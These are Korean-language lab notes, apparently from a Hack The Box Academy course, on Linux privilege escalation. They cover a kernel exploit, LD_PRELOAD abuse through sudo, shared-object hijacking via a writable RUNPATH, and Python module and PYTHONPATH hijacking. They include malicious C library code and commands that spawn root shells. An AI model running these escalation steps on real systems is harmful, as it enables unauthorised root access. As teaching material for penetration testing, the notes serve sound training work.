# (★)Kernel Exploits

Kernel Exploit에는 대표적으로 Dirty COW (CVE-2016-5195)가 있다. 커널의 취약성을 이용하여 루트 권한으로 코드를 실행한다. 커널 익스플로잇에 취약한 시스템을 찾는 것은 매우 흔하다.

## Kernel Exploit Example

**Kernel level과 Linux OS 버전 확인**
```powershell
hunji@htb[/htb]$ uname -a

Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

```powershell
hunji@htb[/htb]$ cat /etc/lsb-release 

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"
```
→ 구글에 linux 4.4.0-116-generic exploit 라고 검색하면 [https://vulners.com/zdt/1337DAY-ID-30003](https://vulners.com/zdt/1337DAY-ID-30003) PoC가 나온다.

`wget` 나 파일 전송 방법으로 다운받고, gcc 로 컴파일 후 `chmod +x` 를 해주자
```powershell
hunji@htb[/htb]$ gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
```

익스플로잇을 실행하면, root 쉘을 획득할 수 있다.
```powershell
hunji@htb[/htb]$ ./kernel_exploit 

task_struct = ffff8800b71d7000
uidptr = ffff8800b95ce544
spawning root shell
```

```powershell
root@htb[/htb]# whoami

root
```

# Shared Libraries

Linux에서는 **static library** (`.a`) 와 **dynamically linked shared object libraries**(`.so`) 가 있다.

`LD_PRELOAD` 환경 변수를 사용하면, 바이너리를 실행하기 전에 라이브러리를 로드할 수 있다. 이 라이브러리 함수는 기본 함수보다 우선적으로 사용된다. 바이너리에 필요한 공유 객체는 `ldd` 유틸리티를 사용하여 볼 수 있다.

```powershell
htb_student@NIX02:~$ ldd /bin/ls

	linux-vdso.so.1 =>  (0x00007fff03bc7000)
	libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)
	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)
	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)
```

위는 `/bin/ls` 가 필요로 하는 절대 경로의 라이브러리들을 보여준다.

## LD_PRELOAD 권한 상승

유저에게 우선 `sudo` 권한이 있어야 이를 악용할 수 있다.

```powershell
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

사용자는 root 권한으로 아파치 서비스를 재시작할 수 있는 권한을 가지고 있지만, GTFOBin에서 활용할 수 없으며, 절대 경로를 지정하는 `/etc/sudoers` 항목이 작성되었으므로 정상적인 상황에서는 사용할 수 없다.

하지만 `LD_PRELOAD` 문제를 악용한다면 사용자 지정 공유 라이브러리 파일을 실행할 수 있다.

```powershell
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

```powershell
htb_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles
```

그리고 다음과 같은 커맨드로 권한상승을 할 수 있다.

```powershell
htb_student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

id
uid=0(root) gid=0(root) groups=0(root)
```

# Shared Object Hijacking

개발 중인 프로그램이나 바이너리에는 사용자 지정 라이브러리가 존재한다. 다음의 SETUID 바이너리를 생각해보자

```powershell
htb-student@NIX02:~$ ls -la payroll

-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
```

`ldd`로 사용 라이브러리 분석

```powershell
htb-student@NIX02:~$ ldd payroll

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```

기본 라이브러리가 아닌 `libshared.so`를 확인 → RUNPATH 설정을 통해 /development 폴더에서 로드되는 것을 확인.

```powershell
htb-student@NIX02:~$ readelf -d payroll  | grep PATH

 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

`/development` 폴더 권한이 777임을 확인

```powershell
htb-student@NIX02:~$ ls -la /development/

total 8
drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../
```

어떤 함수가 호출되는지 확인

```powershell
htb-student@NIX02:~$ ldd payroll

linux-vdso.so.1 (0x00007ffd22bbc000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)
```

```powershell
htb-student@NIX02:~$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
```

```powershell
htb-student@NIX02:~$ ./payroll 

./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

**악의적인 라이브러리 생성**

```powershell
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\\n");
    setuid(0);
    system("/bin/sh -p");
} 

```

```powershell
htb-student@NIX02:~$ gcc src.c -fPIC -shared -o /development/libshared.so
```

권한 상승 exploit

```powershell
htb-student@NIX02:~$ ./payroll 

***************Inlane Freight Employee Database***************

Malicious library loaded
# id
uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)
```

# Python Library Hijacking

## 잘못된 쓰기 권한

하나 또는 다른 파이썬 모듈은 실수로 모든 사용자에게 쓰기 권한을 설정했을 때, 이를 통해 파이썬 모듈을 편집하고 조작하여 원하는 결과를 유도할 수 있음

**파이썬 스크립트에 SUID 설정 확인**

```powershell
htb-student@lpenix:~$ ls -l mem_status.py

-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
```

**mem_status.py**

```powershell
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

→ psutil 사용. 해당 모듈에 쓰기 권한이 있는지 확인

```powershell
htb-student@lpenix:~$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():

htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

**virtual_memory() 수정**

```powershell
...SNIP...

def virtual_memory():

	...SNIP...
	#### Hijacking
	import os
	os.system('id')
	

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

**권한 상승**

```powershell
htb-student@lpenix:~$ sudo /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%
```

## 라이브러리 경로

module의 우선 순위는 위에서 아래가 된다.

```powershell
htb-student@lpenix:~$ python3 -c 'import sys; print("\\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

psutil 모듈의 경로는 4번째임을 확인

```powershell
htb-student@lpenix:~$ pip3 show psutil

...SNIP...
Location: /usr/local/lib/python3.8/dist-packages

...SNIP...
```

잘못 구성된 디렉토리 권한 확인

```powershell
htb-student@lpenix:~$ ls -la /usr/lib/python3.8

total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
...SNIP...
```

하이재킹된 모듈 [psutil.py](http://psutil.py) (/usr/lib/python3.8 에 업로드)

```powershell
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

권한 상승

```powershell
htb-student@lpenix:~$ sudo /usr/bin/python3 mem_status.py

uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
  File "mem_status.py", line 4, in <module>
    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
AttributeError: 'NoneType' object has no attribute 'available' 
```

## PYTHONPATH 환경 변수

파이썬이 가져올 모듈을 검색할 수 있는 디렉터리를 나타내는 환경 변수는 PYTHONPATH이다. sudo 권한을 확인했을 때, 파이썬 바이너리에 대한 환경 변수를 설정할 수 있는 권한이 있다면 exploit이 가능하다.

**sudo 권한 확인**

```powershell
htb-student@lpenix:~$ sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

→ SETENV: 플래그를 설정하여 이 바이너리에 사용할 환경 변수를 설정할 수 있다.

**PYTHONPATH 환경 변수를 통한 권한 상승**

```powershell
htb-student@lpenix:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
...SNIP...
```